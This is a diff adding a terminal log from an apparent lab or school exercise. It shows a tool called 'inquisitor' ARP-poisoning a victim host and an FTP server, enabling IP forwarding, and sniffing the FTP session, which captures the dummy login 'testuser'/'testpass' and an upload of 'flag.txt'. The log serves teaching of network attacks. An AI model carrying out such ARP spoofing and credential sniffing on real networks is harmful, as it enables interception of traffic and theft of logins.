@@ -1,0 +1,176 @@
+root@2f91c47abc8b:/app# arp
+Address                  HWtype  HWaddress           Flags Mask            Iface
+victim.inquisitor_inqui  ether   4e:85:63:41:52:ff   C                     eth0
+ftp-server.inquisitor_i  ether   9a:2d:32:30:ba:32   C                     eth0
+root@2f91c47abc8b:/app# ./dist/inquisitor 10.0.0.30 9a:2d:32:30:ba:32 10.0.0.20 4e:85:63:41:52:ff
+[*] Starting Inquisitor...
+    -> Gateway: 10.0.0.30 (9a:2d:32:30:ba:32)
+    -> Target:  10.0.0.20 (4e:85:63:41:52:ff)
+[*] Enabling IP forwarding...
+[*] Starting ARP poisoning... Press CTRL+C to stop.
+[*] Poisoning in progress. Waiting a moment...
+[*] Starting FTP sniffer on port 21...
+. (TCP packet seen: Ether / IP / TCP 10.0.0.20:35582 > 10.0.0.30:ftp S)
+. (TCP packet seen: Ether / IP / TCP 10.0.0.20:35582 > 10.0.0.30:ftp S)
+. (TCP packet seen: Ether / IP / TCP 10.0.0.30:ftp > 10.0.0.20:35582 SA)
+. (TCP packet seen: Ether / IP / TCP 10.0.0.30:ftp > 10.0.0.20:35582 SA)
+. (TCP packet seen: Ether / IP / TCP 10.0.0.20:35582 > 10.0.0.30:ftp A)
+. (TCP packet seen: Ether / IP / TCP 10.0.0.20:35582 > 10.0.0.30:ftp A)
+. (TCP packet seen: Ether / IP / TCP 10.0.0.30:ftp > 10.0.0.20:35582 PA / Raw)
+    -> Payload: '220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
+220-You are user number 1 of 5 allowed.
+220-Local time is now 15:52. Server port: 21.
+220-This is a private system - No anonymous login
+220-IPv6 connections are also welcome on this server.
+220 You will be disconnected after 15 minutes of inactivity.'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.30:ftp > 10.0.0.20:35582 PA / Raw)
+    -> Payload: '220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
+220-You are user number 1 of 5 allowed.
+220-Local time is now 15:52. Server port: 21.
+220-This is a private system - No anonymous login
+220-IPv6 connections are also welcome on this server.
+220 You will be disconnected after 15 minutes of inactivity.'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.20:35582 > 10.0.0.30:ftp A)
+. (TCP packet seen: Ether / IP / TCP 10.0.0.20:35582 > 10.0.0.30:ftp A)
+. (TCP packet seen: Ether / IP / TCP 10.0.0.20:35582 > 10.0.0.30:ftp PA / Raw)
+    -> Payload: 'FEAT'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.20:35582 > 10.0.0.30:ftp PA / Raw)
+    -> Payload: 'FEAT'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.30:ftp > 10.0.0.20:35582 A)
+. (TCP packet seen: Ether / IP / TCP 10.0.0.30:ftp > 10.0.0.20:35582 A)
+. (TCP packet seen: Ether / IP / TCP 10.0.0.30:ftp > 10.0.0.20:35582 PA / Raw)
+    -> Payload: '211-Extensions supported:
+ EPRT
+ IDLE
+ MDTM
+ SIZE
+ MFMT
+ REST STREAM
+ MLST type*;size*;sizd*;modify*;UNIX.mode*;UNIX.uid*;UNIX.gid*;unique*;
+ MLSD
+ AUTH TLS
+ PBSZ
+ PROT
+ UTF8
+ TVFS
+ ESTA
+ PASV
+ EPSV
+ SPSV
+211 End.'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.30:ftp > 10.0.0.20:35582 PA / Raw)
+    -> Payload: '211-Extensions supported:
+ EPRT
+ IDLE
+ MDTM
+ SIZE
+ MFMT
+ REST STREAM
+ MLST type*;size*;sizd*;modify*;UNIX.mode*;UNIX.uid*;UNIX.gid*;unique*;
+ MLSD
+ AUTH TLS
+ PBSZ
+ PROT
+ UTF8
+ TVFS
+ ESTA
+ PASV
+ EPSV
+ SPSV
+211 End.'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.20:35582 > 10.0.0.30:ftp PA / Raw)
+    -> Payload: 'AUTH TLS'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.20:35582 > 10.0.0.30:ftp PA / Raw)
+    -> Payload: 'AUTH TLS'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.30:ftp > 10.0.0.20:35582 PA / Raw)
+    -> Payload: '500 This security scheme is not implemented'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.30:ftp > 10.0.0.20:35582 PA / Raw)
+    -> Payload: '500 This security scheme is not implemented'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.20:35582 > 10.0.0.30:ftp PA / Raw)
+    -> Payload: 'OPTS UTF8 ON'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.20:35582 > 10.0.0.30:ftp PA / Raw)
+    -> Payload: 'OPTS UTF8 ON'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.30:ftp > 10.0.0.20:35582 PA / Raw)
+    -> Payload: '200 OK, UTF-8 enabled'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.30:ftp > 10.0.0.20:35582 PA / Raw)
+    -> Payload: '200 OK, UTF-8 enabled'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.20:35582 > 10.0.0.30:ftp PA / Raw)
+    -> Payload: 'USER testuser'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.20:35582 > 10.0.0.30:ftp PA / Raw)
+    -> Payload: 'USER testuser'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.30:ftp > 10.0.0.20:35582 PA / Raw)
+    -> Payload: '331 User testuser OK. Password required'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.30:ftp > 10.0.0.20:35582 PA / Raw)
+    -> Payload: '331 User testuser OK. Password required'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.20:35582 > 10.0.0.30:ftp PA / Raw)
+    -> Payload: 'PASS testpass'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.20:35582 > 10.0.0.30:ftp PA / Raw)
+    -> Payload: 'PASS testpass'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.30:ftp > 10.0.0.20:35582 PA / Raw)
+    -> Payload: '230 OK. Current directory is /'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.30:ftp > 10.0.0.20:35582 PA / Raw)
+    -> Payload: '230 OK. Current directory is /'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.20:35582 > 10.0.0.30:ftp PA / Raw)
+    -> Payload: 'OPTS MLST type;size;modify;UNIX.mode;UNIX.uid;UNIX.gid;'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.20:35582 > 10.0.0.30:ftp PA / Raw)
+    -> Payload: 'OPTS MLST type;size;modify;UNIX.mode;UNIX.uid;UNIX.gid;'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.30:ftp > 10.0.0.20:35582 PA / Raw)
+    -> Payload: '200  MLST OPTS type;size;sizd;modify;UNIX.mode;UNIX.uid;UNIX.gid;unique;'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.30:ftp > 10.0.0.20:35582 PA / Raw)
+    -> Payload: '200  MLST OPTS type;size;sizd;modify;UNIX.mode;UNIX.uid;UNIX.gid;unique;'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.20:35582 > 10.0.0.30:ftp PA / Raw)
+    -> Payload: 'PWD'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.20:35582 > 10.0.0.30:ftp PA / Raw)
+    -> Payload: 'PWD'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.30:ftp > 10.0.0.20:35582 PA / Raw)
+    -> Payload: '257 "/" is your current location'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.30:ftp > 10.0.0.20:35582 PA / Raw)
+    -> Payload: '257 "/" is your current location'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.20:35582 > 10.0.0.30:ftp PA / Raw)
+    -> Payload: 'TYPE I'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.20:35582 > 10.0.0.30:ftp PA / Raw)
+    -> Payload: 'TYPE I'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.30:ftp > 10.0.0.20:35582 PA / Raw)
+    -> Payload: '200 TYPE is now 8-bit binary'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.30:ftp > 10.0.0.20:35582 PA / Raw)
+    -> Payload: '200 TYPE is now 8-bit binary'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.20:35582 > 10.0.0.30:ftp PA / Raw)
+    -> Payload: 'PASV'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.20:35582 > 10.0.0.30:ftp PA / Raw)
+    -> Payload: 'PASV'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.30:ftp > 10.0.0.20:35582 PA / Raw)
+    -> Payload: '227 Entering Passive Mode (10,0,0,30,117,55)'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.30:ftp > 10.0.0.20:35582 PA / Raw)
+    -> Payload: '227 Entering Passive Mode (10,0,0,30,117,55)'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.20:35582 > 10.0.0.30:ftp PA / Raw)
+    -> Payload: 'STOR flag.txt'
+
+[+] FTP Filename detected: STOR flag.txt
+
+. (TCP packet seen: Ether / IP / TCP 10.0.0.20:35582 > 10.0.0.30:ftp PA / Raw)
+    -> Payload: 'STOR flag.txt'
+
+[+] FTP Filename detected: STOR flag.txt
+
+. (TCP packet seen: Ether / IP / TCP 10.0.0.30:ftp > 10.0.0.20:35582 PA / Raw)
+    -> Payload: '150 Accepted data connection'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.30:ftp > 10.0.0.20:35582 PA / Raw)
+    -> Payload: '150 Accepted data connection'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.30:ftp > 10.0.0.20:35582 PA / Raw)
+    -> Payload: '226-File successfully transferred
+226 0.000 seconds (measured here), 48.76 Kbytes per second'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.30:ftp > 10.0.0.20:35582 PA / Raw)
+    -> Payload: '226-File successfully transferred
+226 0.000 seconds (measured here), 48.76 Kbytes per second'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.20:35582 > 10.0.0.30:ftp A)
+. (TCP packet seen: Ether / IP / TCP 10.0.0.20:35582 > 10.0.0.30:ftp A)
+. (TCP packet seen: Ether / IP / TCP 10.0.0.20:35582 > 10.0.0.30:ftp PA / Raw)
+    -> Payload: 'MFMT 20251007155219 flag.txt'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.20:35582 > 10.0.0.30:ftp PA / Raw)
+    -> Payload: 'MFMT 20251007155219 flag.txt'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.30:ftp > 10.0.0.20:35582 PA / Raw)
+    -> Payload: '213 UTIME OK'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.30:ftp > 10.0.0.20:35582 PA / Raw)
+    -> Payload: '213 UTIME OK'
+. (TCP packet seen: Ether / IP / TCP 10.0.0.20:35582 > 10.0.0.30:ftp A)
+. (TCP packet seen: Ether / IP / TCP 10.0.0.20:35582 > 10.0.0.30:ftp A)
